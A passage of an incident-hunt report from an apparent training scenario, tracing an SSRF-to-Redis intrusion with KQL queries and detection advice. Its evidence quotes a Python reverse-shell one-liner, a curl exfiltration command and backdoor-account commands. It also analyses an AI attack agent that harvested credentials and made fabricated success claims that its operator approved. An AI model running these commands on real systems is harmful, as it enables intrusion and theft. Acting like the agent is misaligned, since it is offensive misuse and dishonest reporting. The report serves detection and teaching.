+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Computer =~ &quot;sc-portal01&quot; and UrlOriginal has &quot;gopher://&quot;
+| project TimeGenerated, SrcIpAddr, UrlOriginal, HttpStatusCode
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Block <code>203.0.113.87</code>. Treat any non-https scheme in the preview <code>url</code> as the durable signal.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S1.4: Exploitation chain</span><span class="sum-tags">T1190, T1053.003, T1059.006</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Prove how a web request became code running as root.</p>
+<h3>Finding</h3>
+<p>SSRF to <code>gopher://</code> to Redis, a root cron entry (most likely written by Redis, which is not logged), cron ran a Python reverse shell to <code>203.0.113.87:443</code>. The web request is in the access log, the cron command is in syslog, and the process tree is in the process table: cron (PID 4400) spawns python3 (PID 4401) as root.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Syslog (CRON)</div><div class="kv-val"><code>(root) CMD (python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("203.0.113.87",443));os.dup2(...);subprocess.call(["/bin/sh","-i"])')</code> at 06:52:49.907</div></div><div class="kv-item"><div class="kv-key">Process</div><div class="kv-val"><code>python3</code> PID 4401, parent <code>cron</code> 4400, account <code>root</code>, 06:52:52</div></div><div class="kv-item"><div class="kv-key">Not observed</div><div class="kv-val">Redis writing the cron file. No Redis log and no file event. That step is inferred</div></div></div>
+<h3>Benign Look-Alikes Ruled Out</h3>
+<p>Other cron jobs in the window (<code>queue-drain.sh</code>, <code>service-ports.sh</code>, <code>disk.sh</code>, <code>ntpdate</code>, <code>find /var/tmp</code>, <code>certbot renew</code>) are known maintenance commands. Only one runs an inline Python socket.</p>
+<h3>Why It Matters</h3>
+<p>The 200 on the web request only proves Redis received bytes. Two other sources prove code ran.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">Syslog
+| where TimeGenerated between (datetime(2026-09-20 06:52:40) .. datetime(2026-09-20 07:00:00))
+| where Computer =~ &quot;sc-portal01&quot; and ProcessName =~ &quot;CRON&quot;
+| summarize Runs = count(), First = min(TimeGenerated) by SyslogMessage
+| order by First asc
+</code></pre>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-20 06:52:40) .. datetime(2026-09-20 06:53:40))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| project Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, FileName, ProcessId, ProcessCommandLine
+| order by Timestamp asc
+</code></pre>
+<h3>Screenshots</h3>
+<figure><a href="Screenshots/What%20did%20Cron%20run.png" target="_blank" rel="noopener"><img src="Screenshots/What%20did%20Cron%20run.png" alt="The one cron job that runs inline Python"></a><figcaption>The one cron job that runs inline Python</figcaption></figure>
+<figure><a href="Screenshots/Process%20lineage.png" target="_blank" rel="noopener"><img src="Screenshots/Process%20lineage.png" alt="cron 4400 spawns python3 4401 as root"></a><figcaption>cron 4400 spawns python3 4401 as root</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Related rule: DR-01. <strong>Hunting Tip:</strong> the cron entry was the only way in that survived a restart of the web app, so check cron directories on every host the web user can reach.</p>
+<p><strong>MITRE Reference:</strong> <a href="https://attack.mitre.org/techniques/T1053/003">T1053.003</a></p></div></details>
+<h3>Section 2: Credential Harvest</h3>
+<details class="phase"><summary><span class="phase-title">Flag S2.1: Configuration file and process tree</span><span class="sum-tags">T1552.001, T1083</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find what the shell read and prove it was the same shell.</p>
+<h3>Finding</h3>
+<p>At 07:05:15 <code>cat /etc/semicrest/portal.conf</code> ran as root (PID 4410) under python3 (4401) under cron (4400). At 07:05:21 <code>env</code> ran and at 07:05:27 <code>find / -name "*.conf" -o -name "*.env" -o -name ".env"</code> ran, 6 seconds apart each.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>DeviceProcessEvents_CL.ProcessCommandLine</code>, <code>InitiatingProcessFileName</code>, <code>InitiatingProcessId</code></div></div><div class="kv-item"><div class="kv-key">File</div><div class="kv-val"><code>/etc/semicrest/portal.conf</code></div></div><div class="kv-item"><div class="kv-key">Tree</div><div class="kv-val">cron 4400, python3 4401 (root), cat 4410</div></div></div>
+<h3>Benign Look-Alikes Ruled Out</h3>
+<p><code>gunicorn</code> restarts by <code>www-data</code> and <code>dpkg --audit</code> or <code>apt-get</code> by named admins in the same window all have parent <code>bash</code>, not python3.</p>
+<h3>Why It Matters</h3>
+<p>A <code>cat</code> on a config file is normal admin work. The lineage (cat under python3 under cron) makes it the attacker's, and ties it to the exploit.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-20 07:00:00) .. datetime(2026-09-20 07:10:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName, InitiatingProcessId
+| order by Timestamp asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S2%20portal.conf%20read%20by%20cat%20under%20python3.png" target="_blank" rel="noopener"><img src="Screenshots/S2%20portal.conf%20read%20by%20cat%20under%20python3.png" alt="cat, env and find as root under python3"></a><figcaption>cat, env and find as root under python3</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Alert when a file-reading tool reads <code>*.conf</code>, <code>*.env</code> or <code>/etc/&lt;app&gt;/</code> and its parent is an interpreter whose own parent is <code>cron</code>.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S2.2: Database credential</span><span class="sum-tags">T1552.001, T1078</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find the database login in the file and prove it was used.</p>
+<h3>Finding</h3>
+<p>The process log shows the file was read, never its contents. The agent's <code>harvest_creds</code> tool call (via MCP) quotes the file, including a <code>DATABASE_URL</code> for user <code>portal_svc</code> on <code>10.5.0.20:5432</code>. The same shell connected to <code>10.5.0.20:5432</code> at 07:16:11.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Command lines</div><div class="kv-val">The password was never typed into a command: <code>DeviceProcessEvents_CL.ProcessCommandLine</code> has no psql or PGPASSWORD</div></div><div class="kv-item"><div class="kv-key">Agent log</div><div class="kv-val"><code>LLMAgentLogs_CL.model_response</code>, <code>tool_name</code> = <code>harvest_creds</code></div></div><div class="kv-item"><div class="kv-key">Network</div><div class="kv-val"><code>DeviceNetworkEvents_CL</code>: python3 to <code>10.5.0.20:5432</code> at 07:16:11.959, PID 4401</div></div></div>
+<h3>Why It Matters</h3>
+<p>The agent's narration is a claim. The connection from the shell to the database port is the infrastructure fact that backs it. The credential proves access to the connection string, not by itself a login or a query; the queries in S3 do that.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">LLMAgentLogs_CL
+| where TimeGenerated between (datetime(2026-10-01 00:00:00) .. datetime(2026-12-31 23:59:59))
+| where * has &quot;portal.conf&quot;
+| take 20
+</code></pre>
+<blockquote>
+<p>The agent log is stamped with its upload date (October 2026), not the attack date, so the query window covers October and the match is made by time of day and session ID.</p>
+</blockquote>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/Credential%20harvested%20by%20agent.png" target="_blank" rel="noopener"><img src="Screenshots/Credential%20harvested%20by%20agent.png" alt="The agent's harvest_creds call quoting portal.conf"></a><figcaption>The agent's harvest_creds call quoting portal.conf</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Stop storing the login in a readable file. Detect a <code>portal_svc</code> session that lacks the <code>application_name</code> label the real application sends.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S2.3: Registry credential</span><span class="sum-tags">T1552.001, T1078</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find the second credential pair in the same file.</p>
+<h3>Finding</h3>
+<p>The same <code>harvest_creds</code> row quotes <code>REGISTRY_API=https://10.5.0.30/api/v2.0</code> with a <code>REGISTRY_USER</code> of <code>ci-builder</code> and its password. The same file also pointed to <code>REDIS_URL</code> and <code>ADMIN_API</code> (<code>10.5.0.40:8443</code>). The target is the registry host <code>10.5.0.30</code> (<code>sc-registry01</code>).</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>LLMAgentLogs_CL.model_response</code>, <code>tool_result</code> ("ci-builder (harbor)")</div></div></div>
+<h3>Why It Matters</h3>
+<p>One plain-text file mapped the estate and held two keys. It proves the credential was obtained, not that the registry was changed; flag S3.3 covers what was done with it.</p>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S2%20agent%20log%20portal.conf%20contents.png" target="_blank" rel="noopener"><img src="Screenshots/S2%20agent%20log%20portal.conf%20contents.png" alt="Both credential pairs in one agent log row"></a><figcaption>Both credential pairs in one agent log row</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Move all secrets to a vault and give each service its own narrow account.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S2.4: Visibility gap</span><span class="sum-tags">T1552.001</span><span class="badge badge-medium">Medium</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Say whether the <code>env</code> command found more credentials.</p>
+<h3>Finding</h3>
+<p>Unknown. <code>env</code> ran as PID 4411 at 07:05:21, but process telemetry records the command, not its output. The <code>portal.conf</code> contents are visible only because the agent narrated them. No agent tool call covers <code>env</code>.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Command</div><div class="kv-val"><code>DeviceProcessEvents_CL</code>: <code>env</code>, PID 4411, root, parent python3 4401</div></div><div class="kv-item"><div class="kv-key">Output</div><div class="kv-val">Not in any table checked</div></div></div>
+<h3>Why It Matters</h3>
+<p>Naming a visibility gap correctly is a finding. Any secret held in the portal's environment should be treated as exposed and rotated.</p>
+<h3>Detection Recommendation</h3>
+<p>Audit reads of <code>/proc/*/environ</code> and record command output on internet-facing hosts.</p></div></details>
+<h3>Section 3: Lateral Movement</h3>
+<details class="phase"><summary><span class="phase-title">Flag S3.1: Database query discrimination</span><span class="sum-tags">T1213.006</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Separate the attacker's queries from the application's, on the same account.</p>
+<h3>Finding</h3>
+<p>Three properties separate them: statement structure (the app uses explicit columns, <code>$1</code> parameters, <code>WHERE</code> and <code>LIMIT</code>; the attacker used <code>SELECT *</code>), target selection (the attacker read <code>information_schema</code> and <code>pg_catalog.pg_shadow</code>), and cadence (five statements in 9 seconds against steady application traffic). The attacker's connections also lacked the <code>application_name=portal_svc</code> label, from 07:16:14.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>Syslog.SyslogMessage</code> (<code>ProcessName</code> = <code>postgres</code>, <code>Computer</code> = <code>sc-db01</code>)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Burst</div><div class="kv-val">07:16:16 <code>SELECT * FROM users</code>, 07:16:19 projects, 07:16:22 customers, 07:16:23 <code>information_schema.tables</code>, 07:16:25 <code>pg_catalog.pg_shadow</code></div></div></div>
+<h3>Benign Look-Alikes Ruled Out</h3>
+<p>The application's own statements (<code>UPDATE projects SET last_accessed=now() WHERE id=$1</code>, <code>INSERT INTO audit_log ...</code>) repeat all morning. See DR-02 for one earlier burst of the same six statements that is not explained.</p>
+<h3>Why It Matters</h3>
+<p>The username tells you nothing, because the attacker used the application's own account.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">Syslog
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Computer =~ &quot;sc-db01&quot; and ProcessName =~ &quot;postgres&quot;
+| where SyslogMessage !has &quot;connection&quot;
+| summarize Count = count(), First = min(TimeGenerated), Last = max(TimeGenerated) by SyslogMessage
+| order by First asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/query%20differences%20between%20system%20and%20attacker.png" target="_blank" rel="noopener"><img src="Screenshots/query%20differences%20between%20system%20and%20attacker.png" alt="Application queries against the attacker's burst"></a><figcaption>Application queries against the attacker's burst</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Related rule: DR-02.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S3.2: Queried tables</span><span class="sum-tags">T1213.006, T1087</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Name the tables read outside normal application patterns.</p>
+<h3>Finding</h3>
+<p>The tables after <code>FROM</code> were <code>users</code>, <code>projects</code>, <code>customers</code>, <code>information_schema.tables</code> and <code>pg_catalog.pg_shadow</code>. The second wave at 07:45 read specific columns: project name, revision and team lead; email, phone and company; username, <code>password_hash</code>, role and last login.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Table</th>
+<th>Contents</th>
+<th>Why the attacker wants it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>users</code></td>
+<td>Accounts, roles, password hashes</td>
+<td>Crack hashes, find admins</td>
+</tr>
+<tr>
+<td><code>projects</code></td>
+<td>Design metadata</td>
+<td>The intellectual property</td>
+</tr>
+<tr>
+<td><code>customers</code></td>
+<td>Email, phone, company</td>
+<td>Contact data</td>
+</tr>
+<tr>
+<td><code>information_schema.tables</code></td>
+<td>List of every table</td>
+<td>Map for further reads</td>
+</tr>
+<tr>
+<td><code>pg_catalog.pg_shadow</code></td>
+<td>Database role password hashes</td>
+<td>Superuser credentials</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Why It Matters</h3>
+<p>The log records which tables were asked for, not what came back. Do not claim rows were copied; claim they were read.</p>
+<p>The 07:16 burst is tied to the attacker's process: PID 4401 connected to <code>10.5.0.20:5432</code> at 07:16:11. The 07:45 wave has no matching new connection from the portal in the network table, so I attribute it to the attacker by pattern and timing, with moderate confidence.</p>
+<h3>Detection Recommendation</h3>
+<p>Related rule: DR-02.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S3.3: Registry enumeration</span><span class="sum-tags">T1078, T1083</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find what the stolen registry account did that its owner never does.</p>
+<h3>Finding</h3>
+<p>In the baseline <code>ci-builder</code> only runs <code>pull_artifact</code> (49) and <code>push_artifact</code> (16) from the CI server <code>10.5.0.100</code>. From <code>10.5.0.10</code> at 07:33:01 to 07:33:05 it ran <code>login</code>, <code>list_repository</code>, <code>pull_manifest</code> and <code>inspect_layer</code>, all 200.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Operation</th>
+<th>Repository</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>07:33:01</td>
+<td>login</td>
+<td></td>
+</tr>
+<tr>
+<td>07:33:03</td>
+<td>list_repository</td>
+<td><code>semicrest</code></td>
+</tr>
+<tr>
+<td>07:33:04</td>
+<td>pull_manifest</td>
+<td><code>semicrest/portal-build</code></td>
+</tr>
+<tr>
+<td>07:33:05</td>
+<td>inspect_layer</td>
+<td><code>semicrest/portal-build</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3>Why It Matters</h3>
+<p>A CI pipeline already knows its image names, so it never browses. No <code>push_artifact</code> came from the portal, so there is no sign the image was changed.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">ContainerRegistryLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Username == &quot;ci-builder&quot;
+| summarize count() by Operation, SrcIpAddr
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/Registry%20operations%20ci-builder.png" target="_blank" rel="noopener"><img src="Screenshots/Registry%20operations%20ci-builder.png" alt="ci-builder baseline against the four new operations"></a><figcaption>ci-builder baseline against the four new operations</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Alert on <code>login</code>, <code>list_repository</code> or <code>inspect_layer</code> by a CI service account from any address other than the CI server.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S3.4: Admin API response</span><span class="sum-tags">T1082</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find what the admin API did with the attacker's request for secrets.</p>
+<h3>Finding</h3>
+<p>From <code>10.5.0.10</code>, <code>portal_svc</code> got 200 on <code>/api/v1/services</code> (07:45:27) and <code>/api/v1/topology</code> (07:45:31), then 403 Forbidden on <code>/api/v1/secrets</code> (07:45:32). The routine callers of <code>/secrets</code> are named admins from <code>10.5.0.100</code> and <code>10.5.0.101</code>.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Source table.field</div><div class="kv-val"><code>Syslog.SyslogMessage</code> (<code>ProcessName</code> = <code>admin_api</code>, <code>Computer</code> = <code>sc-admin01</code>)</div></div><div class="kv-item"><div class="kv-key">Result</div><div class="kv-val"><code>GET /api/v1/secrets HTTP/1.1 403 src=10.5.0.10 user=portal_svc</code></div></div></div>
+<h3>Why It Matters</h3>
+<p>A 403 means the API knew who <code>portal_svc</code> was and refused its permission. Least privilege worked here and is a defensive success.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">Syslog
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Computer =~ &quot;sc-admin01&quot; and ProcessName =~ &quot;admin_api&quot;
+| where SyslogMessage has &quot;secrets&quot; or SyslogMessage has &quot;10.5.0.10&quot;
+| summarize Count = count(), First = min(TimeGenerated) by SyslogMessage
+| order by First asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/Admin%20API%20403%20secrets.png" target="_blank" rel="noopener"><img src="Screenshots/Admin%20API%20403%20secrets.png" alt="The 403 on /api/v1/secrets from 10.5.0.10"></a><figcaption>The 403 on /api/v1/secrets from 10.5.0.10</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Alert on a 403 to a secrets endpoint from a source that has never used that API.</p></div></details>
+<h3>Section 4: Hallucination</h3>
+<details class="phase"><summary><span class="phase-title">Flag S4.1: Secrets store hallucination</span><span class="sum-tags">T1082</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Test the agent's claim about the admin platform against the infrastructure.</p>
+<h3>Finding</h3>
+<p>At 07:48 (time of day) the agent wrote that it had extracted Kubernetes secrets, TLS certificates, service account tokens and API keys, giving complete access. The admin API had returned 403 on <code>/secrets</code> three minutes earlier and no successful <code>/secrets</code> request came from <code>10.5.0.10</code>. The claim is fabricated.</p>
+<h3>Why It Matters</h3>
+<p>Narration is evidence of what the agent said, not of what happened. Trusting this log would scope the response far too wide.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">LLMAgentLogs_CL
+| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
+| where HuntName == &quot;quartzfang&quot; and model_response contains &quot;Kubernetes&quot;
+| project TimeGenerated, model_response
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Treat attacker-side logs as claims and verify each against infrastructure telemetry before scoping a response.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S4.2: Registry credential hallucination</span><span class="sum-tags">T1552.001</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Test the claim that admin database credentials were found in an image layer.</p>
+<h3>Finding</h3>
+<p>The agent claimed <code>db_admin</code> credentials in the <code>portal-build</code> image layer. The registry log shows four operations from <code>10.5.0.10</code>, and the <code>inspect_layer</code> request hit <code>/additions/vulnerabilities</code>, the vulnerability scan report, with no image pull. Nothing in the log shows credentials in the image. The scenario documentation states the credential does not exist.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Operation</th>
+<th>Resource</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>inspect_layer</td>
+<td><code>/api/v2.0/projects/semicrest/repositories/portal-build/artifacts/latest/additions/vulnerabilities</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3>Why It Matters</h3>
+<p>The registry log records the operation and the resource, not the response. This report therefore says "unsupported by telemetry", not "proved false". Do not list <code>db_admin</code> as a leaked credential.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">ContainerRegistryLog_CL
+| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where Username == &quot;ci-builder&quot; and SrcIpAddr == &quot;10.5.0.10&quot;
+| project Operation, Resource, Repository
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Same rule as S3.3.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S4.3: Hallucination as autonomy limitation</span><span class="sum-tags">T1588.007</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Say what the two false claims mean for how AI-assisted attacks are run.</p>
+<h3>Finding</h3>
+<p>The agent reported success where it had been refused (a 403) or had only read metadata, and it did so confidently. Its output cannot be fed straight into the next phase without checking, so a human sits at the phase gates. Mnemonic: check, then chain.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Table.field</div><div class="kv-val"><code>LLMAgentLogs_CL.user_input</code>, <code>tool_name</code>, <code>model_response</code> (actor <code>quartzfang-agent</code>)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Observation</div><div class="kv-val">The operator's approvals followed each false claim within 1.5 to 3 seconds. Oversight existed in the log but nothing shows it catching either claim</div></div></div>
+<h3>Why It Matters</h3>
+<p>The checking was thin. Possible readings: a rubber stamp, or synthetic timestamps. The log cannot tell them apart.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">LLMAgentLogs_CL
+| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
+| where HuntName == &quot;quartzfang&quot; and actor == &quot;quartzfang-agent&quot;
+| project TimeGenerated, session_id, user_input, tool_name, gate_decision, gate_reason
+| order by TimeGenerated asc
+</code></pre>
+<h3>Detection Recommendation</h3>
+<p>Log the agent's tool calls and results at the source, and diff its claims against host telemetry.</p></div></details>
+<h3>Section 5: Exfiltration and Persistence</h3>
+<details class="phase"><summary><span class="phase-title">Flag S5.1: Exfil destination and staging path</span><span class="sum-tags">T1567, T1074.001</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find where the data went and where it was prepared.</p>
+<h3>Finding</h3>
+<p><code>198.51.100.210:443</code>, with the archive at <code>/tmp/.portal-cache/report.tar.gz.enc</code> (<code>FileCreated</code> 08:02:20). The upload command was <code>curl -s -X POST https://198.51.100.210:443/upload -F file=@/tmp/.portal-cache/report.tar.gz.enc -H 'X-Session: qf-c062-9e4a'</code> at 08:15:00, run by root under python3 PID 4401.</p>
+<h3>Evidence</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">File</div><div class="kv-val"><code>DeviceFileEvents_CL</code>: <code>FileCreated</code>, <code>FolderPath</code> <code>/tmp/.portal-cache/report.tar.gz.enc</code></div></div><div class="kv-item"><div class="kv-key">Command</div><div class="kv-val"><code>DeviceProcessEvents_CL.ProcessCommandLine</code> (curl)</div></div><div class="kv-item"><div class="kv-key">Network</div><div class="kv-val"><code>DeviceNetworkEvents_CL</code>: PID 4401 to <code>198.51.100.210:443</code> at 08:15:08</div></div><div class="kv-item"><div class="kv-key">Link to the agent</div><div class="kv-val">The <code>X-Session</code> header equals <code>LLMAgentLogs_CL.session_id</code></div></div></div>
+<h3>Why It Matters</h3>
+<p>The connection and the staged file prove a channel existed and data was prepared. They do not prove the transfer completed or what the archive contained.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceFileEvents_CL
+| where Timestamp between (datetime(2026-09-20 08:00:00) .. datetime(2026-09-20 08:20:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| project Timestamp, ActionType, FolderPath, FileName, InitiatingProcessFileName
+</code></pre>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-20 08:14:00) .. datetime(2026-09-20 08:16:00))
+| where DeviceName =~ &quot;sc-portal01&quot; and FileName =~ &quot;curl&quot;
+| distinct Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, ProcessCommandLine
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S5%20staged%20archive%20FileCreated.png" target="_blank" rel="noopener"><img src="Screenshots/S5%20staged%20archive%20FileCreated.png" alt="FileCreated for the staged archive in the hidden folder"></a><figcaption>FileCreated for the staged archive in the hidden folder</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Alert on a root-owned <code>curl</code> upload of a file from a hidden folder under <code>/tmp</code>. The <code>X-Session</code> header is also a hunting hook.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S5.2: Staging tools</span><span class="sum-tags">T1560.001, T1074.001</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Name the tools that made the archive and their order.</p>
+<h3>Finding</h3>
+<p><code>tar</code>, then <code>gzip</code>, then <code>openssl</code> (gather, compress, encrypt), all root under python3 PID 4401: <code>tar -cf /tmp/.portal-cache/report.tar /tmp/.portal-cache/data/</code> at 08:02:05, <code>gzip</code> at 08:02:07, <code>openssl enc -aes-256-cbc</code> at 08:02:13.</p>
+<h3>Why It Matters</h3>
+<p>Standard tools leave no malware to detect. Encryption stops content inspection. The contents of the data folder are not visible.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceProcessEvents_CL
+| where Timestamp between (datetime(2026-09-20 08:00:00) .. datetime(2026-09-20 08:20:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| where InitiatingProcessFileName in~ (&quot;python3&quot;, &quot;sh&quot;, &quot;bash&quot;) or AccountName == &quot;root&quot;
+| project Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, FileName, ProcessId, ProcessCommandLine
+| order by Timestamp asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S5%20tar%20gzip%20openssl.png" target="_blank" rel="noopener"><img src="Screenshots/S5%20tar%20gzip%20openssl.png" alt="tar, gzip and openssl as root under python3"></a><figcaption>tar, gzip and openssl as root under python3</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Alert on the sequence tar, gzip, openssl within 10 seconds under an interpreter parent, writing into a hidden directory.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S5.3: Persistence mechanism</span><span class="sum-tags">T1136.001, T1098</span><span class="badge badge-critical">Critical</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Find what was left behind.</p>
+<h3>Finding</h3>
+<p>A new local account <code>svc_monitor</code>: <code>UserAccountCreated</code> at 08:29:44 (and <code>UserAccountModified</code> 08:29:51). The shell ran <code>useradd -m -s /bin/bash svc_monitor</code> (08:29:35), <code>usermod -aG sudo svc_monitor</code> (08:29:45), <code>mkdir -p /home/svc_monitor/.ssh</code> (08:29:53) and <code>ssh-keygen -t ed25519 -f /home/svc_monitor/.ssh/id_ed25519 -N ""</code> (08:29:55). It is the only account event in the window.</p>
+<h3>Why It Matters</h3>
+<p>It is a prepared way back in, with admin rights and an SSH key. The logs do not show it being used, an <code>authorized_keys</code> change, or the private key leaving the host. The two tables disagree by up to 9 seconds, so this report says 08:29.</p>
+<h3>KQL Query Used</h3>
+<pre><code class="language-kql">DeviceEvents_CL
+| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
+| where DeviceName =~ &quot;sc-portal01&quot;
+| summarize Events = count(), First = min(Timestamp) by ActionType, AccountName
+| order by First asc
+</code></pre>
+<h3>Screenshot</h3>
+<figure><a href="Screenshots/S5%20svc_monitor%20useradd%20sudo%20ssh-keygen.png" target="_blank" rel="noopener"><img src="Screenshots/S5%20svc_monitor%20useradd%20sudo%20ssh-keygen.png" alt="useradd, usermod, mkdir and ssh-keygen for svc_monitor"></a><figcaption>useradd, usermod, mkdir and ssh-keygen for svc_monitor</figcaption></figure>
+<h3>Detection Recommendation</h3>
+<p>Related rule: DR-03.</p></div></details>
+<details class="phase"><summary><span class="phase-title">Flag S5.4: Exfil vs legitimate HTTPS</span><span class="sum-tags">T1567, T1071.001</span><span class="badge badge-high">High</span></summary><div class="phase-body"><h3>Objective</h3>
+<p>Separate the exfiltration from normal outbound 443 traffic.</p>
+<h3>Finding</h3>
+<p>Port and process name (<code>python3</code>) are shared. What differs is the process identity: every attacker connection came from PID 4401 (root, parent cron), once each, to new destinations (<code>203.0.113.87</code>, <code>10.5.0.30</code>, <code>198.51.100.210</code>). Normal 443 traffic came from many <code>www-data</code> gunicorn worker PIDs to the same four SaaS IPs across the session.</p>
+<h3>Evidence</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Destination</th>
+<th style="text-align: right;">Connections</th>
+<th>PIDs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.226.16.10, 34.120.195.249, 52.86.241.14, 167.89.118.35 (normal)</td>
+<td style="text-align: right;">9 to 10 each</td>
+<td>6 to 7 different PIDs each</td>
+</tr>
+<tr>
+<td>203.0.113.87, 10.5.0.30, 198.51.100.210 (attacker)</td>
+<td style="text-align: right;">1 each (2 log rows)</td>
+<td>4401</td>
